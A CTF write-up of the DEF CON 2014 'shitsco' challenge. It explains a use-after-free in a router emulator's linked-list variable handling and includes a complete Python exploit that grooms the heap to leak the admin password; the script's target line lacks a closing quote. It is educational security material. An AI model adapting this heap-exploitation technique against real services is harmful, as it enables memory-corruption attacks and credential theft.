# DEF CON CTF Qualifier 2014: shitsco

**Category:** Gynophage
**Points:** 2
**Description:**

> [http://services.2014.shallweplayaga.me/shitsco_c8b1aa31679e945ee64bde1bdb19d035](shitsco_c8b1aa31679e945ee64bde1bdb19d035) is running at:
>
> `shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337`
>
> Capture the flag.

## Write-up

Shitsco is a small router emulator. It allows you to ping, to tracert, to use the shell (Yhea, right! :D) and to set and view variables.

As we smell a rat in the variable handling we look into it.

Variables get stored dynamically in a double linked list as shown next.

```c
struct node {
    char *name;
    char *value;
    struct node *next;
    struct node *prev;
};
```

If you create a couple of nodes and delete the first, its strings get freed, their pointers set to NULL but not the link to the next node. Further, commands like show will always start the traversal by the first node, which will succeed until the corresponding memory gets overwritten. Thats what we gonna exploit.

The key is to set variable name and value the same size as a node internally has -> 4 * 4bytes = 16bytes.
So that when adding nodes, the strings and the node itself consume the same amount of memory.


The following is the memory layout with 3 nodes added(= 3 variables set). Note that there is no first node. The first node is in static memory. Also, every allocated heap block has the same length(size).

```
--------------------------------------------------------------
                   /----link----\
HEAP: [ S ][ S ][ N ][ S ][ S ][ N ][ S ][ S ]    N = Node
                 ^                                S = String
                 |
first.next ------/
--------------------------------------------------------------
```

Because of a bug in the system, the first node never gets unlinked properly.
When we delete it, only the strings get freed and set to NULL. The *next pointer stays the same.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][ N ][ S ][ S ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

Deleting also the second results as depicted next.

```
--------------------------------------------------------------
                   /----link----\
HEAP: [   ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ------/
--------------------------------------------------------------
```

The linked list is still intact because the *next pointers never gets set to NULL when deleting the fist node in the list.

When we now create a new node, the system will use the first static node again and just looks to allocate memory for the name and value. As we created uni-sized blocks, the malloc algorithm would use simply the first two free blocks again. Better would have been, if we had set the first block to a smaller size, let's say 11bytes, so the allocations would be like below.


```
--------------------------------------------------------------
 small\          /----link----\
HEAP: [ ][   ][   ][   ][   ][ N ][ S ][ S ]
first.next ----/
--------------------------------------------------------------
```

If we create now a new variable with 16bytes strings, the malloc algorithm would shift right by one because the first block is too small for both. That results in having the value string in the location the *first.next pointer still points to. By using good values for the string and link pointers we can get the password out of the memory.

>set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))


```
--------------------------------------------------------------
                 /----link----\
HEAP: [ ][ S ][ X ][   ][   ][ N ][ S ][ S ]    X = Fake node
first.next ----/
--------------------------------------------------------------
```

After getting the password, we just have needed to use it
> enable SecretPassword
>
> flag

unfotunately, we were not able to solve it in time.


## exploit.py

Set ip and port and use it with ./exploit.py or ./exploit.py -d

```python
#!/bin/python2
import socket
from struct import pack
import logging
import sys

# SETTINGS
###################################
TARGET = 'shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337
#TARGET = 'localhost:5000'

PASSWORD_ADDR =  0x804c3a0
NULL_NODE_ADDR = 0x804c37c

# Don't touch things below
TCP_IP, TCP_PORT = TARGET.split(':')
TCP_PORT = int(TCP_PORT)

BUF_SIZE = 2000
MARKER = 'aaa: '

# LOGGING
logging.basicConfig(format='%(message)s')
log = logging.getLogger(__name__)
if '-d' in sys.argv: log.setLevel(logging.DEBUG)
else: log.setLevel(logging.INFO)
D = log.debug
I = log.info

# HELPERS
###################################
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    data = s.recv(BUF_SIZE)
    D(data)
    return s

def disconnect(s):
    s.send('quit\n')
    data = s.recv(BUF_SIZE)
    D(data)
    s.close()

def show(s):
    cmd = 'show'
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)
    D(data)
    return data

def set_var(s, name, value='1'):
    cmd = 'set %s %s' % ( name, value)
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

def del_var(s, name):
    cmd = 'set %s' % name
    s.send(cmd + '\n')
    data = s.recv(BUF_SIZE)
    D(cmd)

# MAIN
###################################
s = connect()

set_var(s, 'a' * 11, '01234567890ABCDEF')
set_var(s, 'b' * 16, 'AKABKN|OWNS!!!111')
set_var(s, 'C' * 16, 'XXXXXXXXXXXXXXXXX')

del_var(s, 'a' * 11)
del_var(s, 'b' * 16)

set_var(s, 'HACKHACKHACKHACK', pack('i', PASSWORD_ADDR) * 2 + pack('i', NULL_NODE_ADDR))

data = show(s)
found = data.find(MARKER) if data else 0

if found:
    I('Password: %s', data[found + len(MARKER):data.find('\n$')])

disconnect(s)
```

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln>
* <http://www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-1.html>
* <http://v0ids3curity.blogspot.in/2014/05/defcon-quals-2014-gynophage-shitsco-use.html>
* <http://tasteless.eu/2014/05/def-con-ctf-qualifier-2014-shitsco/>
* [Japanese](http://epsilondelta.hatenablog.jp/entry/2014/05/20/014011)
* <http://sigint.ru/writeups/2014/05/19/defcon-2014-quals--shitsco/>
